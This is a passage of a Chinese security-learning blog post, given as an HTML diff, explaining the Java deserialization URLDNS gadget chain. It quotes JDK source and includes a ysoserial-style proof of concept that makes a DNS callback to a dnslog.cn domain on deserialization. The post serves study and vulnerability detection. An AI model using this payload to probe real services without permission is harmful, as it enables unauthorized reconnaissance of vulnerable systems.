@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 8.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"cxyadvancer.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="前言最近在学习java反序列化的知识，先从入门链开始分析，就是这个urldns链，简单来说就是反序列时发送一次dns请求，特点是只用到了jdk自带的类，并不受版本限制，主要用在漏洞检测，查看是否存在反序列化漏洞点。接下来开始分析 原理分析具体链路就是 1HashMap.readObject()→HashMap.hash()→URL.hashCode()→URLStreamHandler.getHo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java反序列化-URLDNS">
+<meta property="og:url" content="https://cxyadvancer.github.io/2026/04/15/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Urldns/index.html">
+<meta property="og:site_name" content="程序元的blog">
+<meta property="og:description" content="前言最近在学习java反序列化的知识，先从入门链开始分析，就是这个urldns链，简单来说就是反序列时发送一次dns请求，特点是只用到了jdk自带的类，并不受版本限制，主要用在漏洞检测，查看是否存在反序列化漏洞点。接下来开始分析 原理分析具体链路就是 1HashMap.readObject()→HashMap.hash()→URL.hashCode()→URLStreamHandler.getHo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/15/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Urldns/image-20260415200549179.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/15/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Urldns/image-20260415212905339.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/15/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Urldns/image-20260415212920679.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/15/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Urldns/image-20260415215630780.png">
+<meta property="article:published_time" content="2026-04-15T11:33:14.000Z">
+<meta property="article:modified_time" content="2026-04-26T14:13:14.314Z">
+<meta property="article:author" content="程序元">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cxyadvancer.github.io/2026/04/15/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Urldns/image-20260415200549179.png">
+
+<link rel="canonical" href="https://cxyadvancer.github.io/2026/04/15/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Urldns/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>java反序列化-URLDNS | 程序元的blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">程序元的blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://cxyadvancer.github.io/2026/04/15/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Urldns/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="程序元">
+      <meta itemprop="description" content="路漫漫其修远兮，吾将上下而求索。">
+    </span>
+    
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="程序元的blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          java反序列化-URLDNS
+        </h1>
+    
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+    
+              <time title="创建时间：2026-04-15 19:33:14" itemprop="dateCreated datePublished" datetime="2026-04-15T19:33:14+08:00">2026-04-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-04-26 22:13:14" itemprop="dateModified" datetime="2026-04-26T22:13:14+08:00">2026-04-26</time>
+              </span>
+    
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+             <span></span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>undefined 分钟</span>
+            </span>
+    
+        </div>
+      </header>
+    
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+    
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在学习java反序列化的知识，先从入门链开始分析，就是这个urldns链，简单来说就是反序列时发送一次dns请求，特点是只用到了jdk自带的类，并不受版本限制，主要用在漏洞检测，查看是否存在反序列化漏洞点。接下来开始分析</p>
+<h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><p>具体链路就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()→HashMap.hash()→URL.hashCode()→URLStreamHandler.getHostAddress()→InetAddress.getByName()</span><br></pre></td></tr></table></figure>
+
+<p>接下来结合代码具体分析</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="variable">hashCode</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">          <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">      hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">      <span class="keyword">return</span> hashCode;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里定义的hashCode为-1，就是如果hashCode如果不等于-1就返回，如果等于-1就会执行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br></pre></td></tr></table></figure>
+
+<p>看一下hashCode</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the protocol part.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();</span><br><span class="line">        <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">            h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the host part.</span></span><br><span class="line">        <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">        <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">            h += addr.hashCode();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">            <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">                h += host.toLowerCase().hashCode();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the file part.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> u.getFile();</span><br><span class="line">        <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">            h += file.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the port part.</span></span><br><span class="line">        <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">            h += getDefaultPort();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            h += u.getPort();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the ref part.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ref</span> <span class="operator">=</span> u.getRef();</span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="literal">null</span>)</span><br><span class="line">            h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>计算规则是：协议+ip地址+端口+文件路径+锚点。依次通过调用 getProtocol ，getHostAddress，getFile，getPort，getRef 等方法获取到传入的 URL 链接的 Protocol（协议），HostAddress（主机地址），File（文件路径），Port（端口），Ref（锚点，即 # 后面的部分），获取完之后，对每部分调用它们的 hashCode 方法，将结果加到 h 上，最后将 h 返回。</p>
+<p>我们主要关注</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br></pre></td></tr></table></figure>
+
+<p>这里处理会解析dns转换为ip，如果转换失败就会用这个域名，看一个getHostAddress</p>
+<p><img src="/2026/04/15/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Urldns/image-20260415200549179.png" alt="image-20260415200549179"></p>
+<p>主要功能：获取当前url的主机ip地址，有两种情况返回null</p>
+<p>URL 的主机字段为空（<code>URL.getHost()</code> 返回空）；</p>
+<p>DNS 解析失败（无法将主机名映射为 IP 地址）。</p>
+<p>看一下代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hostAddress != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> hostAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (host == <span class="literal">null</span> || host.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        hostAddress = InetAddress.getByName(host);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnknownHostException | SecurityException ex) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hostAddress;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>代码功能就是同上述描述。所以只要URL对象能够调用hashCode方法就可以执行上述过程，那接下来看一个HashMap.readObject()</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">      <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">      ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Read loadFactor (ignore threshold)</span></span><br><span class="line">      <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> fields.get(<span class="string">&quot;loadFactor&quot;</span>, <span class="number">0.75f</span>);</span><br><span class="line">      <span class="keyword">if</span> (lf &lt;= <span class="number">0</span> || Float.isNaN(lf))</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> + lf);</span><br><span class="line"></span><br><span class="line">      lf = Math.min(Math.max(<span class="number">0.25f</span>, lf), <span class="number">4.0f</span>);</span><br><span class="line">      HashMap.UnsafeHolder.putLoadFactor(<span class="built_in">this</span>, lf);</span><br><span class="line"></span><br><span class="line">      reinitialize();</span><br><span class="line"></span><br><span class="line">      s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">      <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">      <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> + mappings);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="comment">// use defaults</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">          <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                     DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                     (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                     MAXIMUM_CAPACITY :</span><br><span class="line">                     tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">          <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">          threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                       (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">          <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">          <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">          SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">          <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">          Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">          table = tab;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">          <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">              <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                  <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">              <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                  <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">              putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里首先就是重写readObject方法，这样当反序列化时就会调用默认的的方法，而是调用这个重写的readObject方法，前面的可以不，关键代码在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putVal(hash(key), key, value, false, false);</span><br></pre></td></tr></table></figure>
+
+<p>这里使用个hash方法，看一下代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里使用了一个三目运算符，如果key为null，直接返回0，否则调用hashCode()。</p>
+<p>当我们把数据放进HashMap时会执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public V put(K key, V value) &#123;</span><br><span class="line">     return putVal(hash(key), key, value, false, true);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这是就已经执行执行了hash()方法，讲过上述分析，会发送一次dns请求，hashCode的值已经改变了，不再是-1，那么当反序列化时就不会再发送dns请求。</p>
+<p>所以要使用反射修改字段值，再次把hashCode改为-1，这样反序列化之后就可以发送dns请求。这个exp在ysoserial的基础上稍微修改一下，逻辑不变</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">URLDNSReplay</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">dnslogDomain</span> <span class="operator">=</span> <span class="string">&quot;dnhmct.dnslog.cn&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 创建不触发DNS的URL</span></span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, <span class="string">&quot;http://&quot;</span> + dnslogDomain, handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 先放入HashMap</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(url, dnslogDomain);  <span class="comment">//  先 put</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 再设置 hashCode = -1</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> URL.class.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.setInt(url, -<span class="number">1</span>);        <span class="comment">//  后 set</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(map);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 反序列化（触发DNS）</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> java.net.URLConnection <span class="title function_">openConnection</span><span class="params">(java.net.URL u)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">synchronized</span> java.net.InetAddress <span class="title function_">getHostAddress</span><span class="params">(java.net.URL u)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/15/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Urldns/image-20260415212905339.png" alt="image-20260415212905339"></p>
+<p><img src="/2026/04/15/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Urldns/image-20260415212920679.png" alt="image-20260415212920679"></p>
+<p>这里分析最下面的这个自定义类</p>
